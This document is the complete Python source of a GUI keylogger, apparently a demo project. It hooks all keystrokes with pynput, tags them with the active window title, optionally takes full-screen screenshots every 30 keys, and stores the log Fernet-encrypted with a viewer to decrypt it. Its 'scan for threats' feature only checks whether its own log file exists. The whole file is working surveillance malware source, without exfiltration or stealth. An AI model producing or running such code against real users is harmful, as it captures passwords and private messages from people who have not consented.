import tkinter as tk
from tkinter import messagebox, scrolledtext, Checkbutton, BooleanVar
import threading
from pynput.keyboard import Listener
import logging
import os
import time
from PIL import ImageGrab
import win32gui
from cryptography.fernet import Fernet

# --- Configuration ---
LOG_FILE = "keylog.txt"
SCREENSHOT_INTERVAL = 30 # Take a screenshot every 30 keys
key_count = 0

# --- Global Variables ---
listener_thread = None
listener_object = None
last_window = None
key_buffer = []

# --- Encryption & Decryption Functions ---
def load_key():
    """Loads the secret key from the 'secret.key' file."""
    return open("secret.key", "rb").read()

def encrypt_log_file():
    """Encrypts the keylog.txt file."""
    try:
        key = load_key()
        f = Fernet(key)
        with open(LOG_FILE, "rb") as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(LOG_FILE, "wb") as file:
            file.write(encrypted_data)
        output_text.insert(tk.END, "\n[INFO] Log file has been encrypted.")
    except FileNotFoundError:
        output_text.insert(tk.END, "\n[ERROR] Log file not found for encryption.")
    except Exception as e:
        output_text.insert(tk.END, f"\n[ERROR] Encryption failed: {e}")

def decrypt_log_and_display():
    """Decrypts the log file and displays its content in the GUI."""
    try:
        key = load_key()
        f = Fernet(key)
        with open(LOG_FILE, "rb") as file:
            encrypted_data = file.read()
        decrypted_data = f.decrypt(encrypted_data)
        output_text.delete('1.0', tk.END)
        output_text.insert(tk.END, decrypted_data.decode())
    except FileNotFoundError:
        messagebox.showerror("Error", "Log file not found.")
    except Exception:
        messagebox.showerror("Error", "Decryption failed. File may not be encrypted or key is wrong.")

# --- Feature Logic ---
def get_active_window():
    try:
        hwnd = win32gui.GetForegroundWindow()
        return win32gui.GetWindowText(hwnd)
    except Exception:
        return "Unknown"

def take_screenshot():
    timestamp = time.strftime("%Y%m%d-%H%M%S")
    filename = f"screenshot-{timestamp}.png"
    ImageGrab.grab().save(filename, "PNG")
    # Log screenshot event directly to the file without using the buffer
    with open(LOG_FILE, "a") as f:
        f.write(f" [SCREENSHOT SAVED: {filename}] ")

# --- Core Logic ---
def start_logging():
    global listener_object, key_count, last_window, key_buffer
    key_count = 0
    last_window = ""
    key_buffer = []

    # Configure logging to write directly without extra formatting
    log_handler = logging.FileHandler(LOG_FILE)
    log_handler.setFormatter(logging.Formatter('%(message)s'))
    logger = logging.getLogger()
    if (logger.hasHandlers()):
        logger.handlers.clear()
    logger.addHandler(log_handler)
    logger.setLevel(logging.INFO)

    def write_buffer_to_log(extra_char=""):
        """Writes the buffer content to the log file."""
        global key_buffer
        if key_buffer:
            logging.info("".join(key_buffer) + extra_char)
            key_buffer = []

    def on_press(key):
        global key_count, last_window, key_buffer
        current_window = get_active_window()
        if current_window != last_window:
            write_buffer_to_log()
            last_window = current_window
            logging.info(f"\n[WINDOW: {current_window} | {time.strftime('%Y-%m-%d %H:%M:%S')}]\n")

        try:
            key_buffer.append(key.char)
        except AttributeError:
            if key == key.space:
                write_buffer_to_log(" ")
            elif key == key.enter:
                write_buffer_to_log("\n")
            elif key == key.backspace:
                if key_buffer:
                    key_buffer.pop()
            else:
                special_key = f" <{str(key).replace('Key.', '')}> "
                write_buffer_to_log(special_key)

        key_count += 1
        if screenshot_enabled.get() and key_count >= SCREENSHOT_INTERVAL:
            take_screenshot()
            key_count = 0

    listener_object = Listener(on_press=on_press)
    listener_object.start()
    update_status("Status: Logging Keystrokes...")
    messagebox.showinfo("Started", "Keylogging has started.")

def stop_logging():
    global listener_object, key_buffer
    if listener_object:
        if key_buffer:
            logging.info("".join(key_buffer))
            key_buffer = []

        listener_object.stop()
        listener_object = None
        update_status("Status: Idle. Encrypting log...")
        messagebox.showinfo("Stopped", "Keylogging stopped. Now encrypting the log file.")
        encrypt_log_file()
        update_status("Status: Idle")

def scan_for_threats():
    output_text.delete('1.0', tk.END)
    output_text.insert(tk.END, "Scanning for threats...\n\n")
    if os.path.exists(LOG_FILE):
        output_text.insert(tk.END, f"[!] Threat Detected!\nReason: Found a suspicious log file '{LOG_FILE}'.")
    else:
        output_text.insert(tk.END, "[+] No threats detected.")

# --- GUI Helper Functions ---
def on_start_button_click():
    global listener_thread
    # Clear the log file before starting a new session
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)
    listener_thread = threading.Thread(target=start_logging, daemon=True)
    listener_thread.start()

def on_stop_button_click():
    stop_logging()

def update_status(message):
    status_label.config(text=message)

# --- Create the GUI Window ---
window = tk.Tk()
window.title("Keylogger")
window.geometry("500x450")
window.resizable(False, False)

control_frame = tk.Frame(window, padx=10, pady=10)
control_frame.pack()

start_button = tk.Button(control_frame, text="Start Logging", command=on_start_button_click, width=15)
start_button.grid(row=0, column=0, padx=5, pady=5)

stop_button = tk.Button(control_frame, text="Stop Logging", command=on_stop_button_click, width=15)
stop_button.grid(row=0, column=1, padx=5, pady=5)

scan_button = tk.Button(control_frame, text="Scan for Threats", command=scan_for_threats, width=15)
scan_button.grid(row=1, column=0, padx=5, pady=5)

decrypt_button = tk.Button(control_frame, text="View Decrypted Log", command=decrypt_log_and_display, width=15)
decrypt_button.grid(row=1, column=1, padx=5, pady=5)

screenshot_enabled = BooleanVar()
screenshot_check = Checkbutton(window, text="Enable Periodic Screenshots", variable=screenshot_enabled)
screenshot_check.pack(pady=5)

status_label = tk.Label(window, text="Status: Idle", bd=1, relief=tk.SUNKEN, anchor=tk.W)
status_label.pack(side=tk.BOTTOM, fill=tk.X)

output_text = scrolledtext.ScrolledText(window, wrap=tk.WORD, width=60, height=18)
output_text.pack(padx=10, pady=10)

# --- Start the Application ---
window.mainloop()
